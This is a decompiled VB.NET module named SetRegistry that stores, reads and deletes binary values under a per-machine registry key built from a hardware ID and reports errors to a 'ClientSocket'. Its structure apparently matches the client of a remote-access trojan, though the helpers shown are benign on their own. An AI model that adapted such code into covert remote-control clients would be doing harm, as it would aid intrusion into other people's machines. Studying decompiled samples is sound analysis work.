Imports System
Imports Client.Connection
Imports Microsoft.Win32

Namespace Client.Helper
	' Token: 0x02000019 RID: 25
	Public Module SetRegistry
		' Token: 0x06000067 RID: 103 RVA: 0x000043D4 File Offset: 0x000025D4
		Public Function SetValue(name As String, value As Byte()) As Boolean
			Try
				Using registryKey As RegistryKey = Registry.CurrentUser.CreateSubKey(SetRegistry.ID, RegistryKeyPermissionCheck.ReadWriteSubTree)
					registryKey.SetValue(name, value, RegistryValueKind.Binary)
					Return True
				End Using
			Catch ex As Exception
				ClientSocket.[Error](ex.Message)
			End Try
			Return False
		End Function

		' Token: 0x06000068 RID: 104 RVA: 0x00004440 File Offset: 0x00002640
		Public Function GetValue(value As String) As Byte()
			Try
				Using registryKey As RegistryKey = Registry.CurrentUser.CreateSubKey(SetRegistry.ID)
					Return CType(registryKey.GetValue(value), Byte())
				End Using
			Catch ex As Exception
				ClientSocket.[Error](ex.Message)
			End Try
			Return Nothing
		End Function

		' Token: 0x06000069 RID: 105 RVA: 0x000044AC File Offset: 0x000026AC
		Public Function DeleteValue(name As String) As Boolean
			Try
				Using registryKey As RegistryKey = Registry.CurrentUser.CreateSubKey(SetRegistry.ID)
					registryKey.DeleteValue(name)
					Return True
				End Using
			Catch ex As Exception
				ClientSocket.[Error](ex.Message)
			End Try
			Return False
		End Function

		' Token: 0x0600006A RID: 106 RVA: 0x00004514 File Offset: 0x00002714
		Public Function DeleteSubKey() As Boolean
			Try
				Using registryKey As RegistryKey = Registry.CurrentUser.OpenSubKey("", True)
					registryKey.DeleteSubKeyTree(SetRegistry.ID)
					Return True
				End Using
			Catch ex As Exception
				ClientSocket.[Error](ex.Message)
			End Try
			Return False
		End Function

		' Token: 0x0400003A RID: 58
		Private ID As String = "Software\" + Settings.Hw_id
	End Module
End Namespace
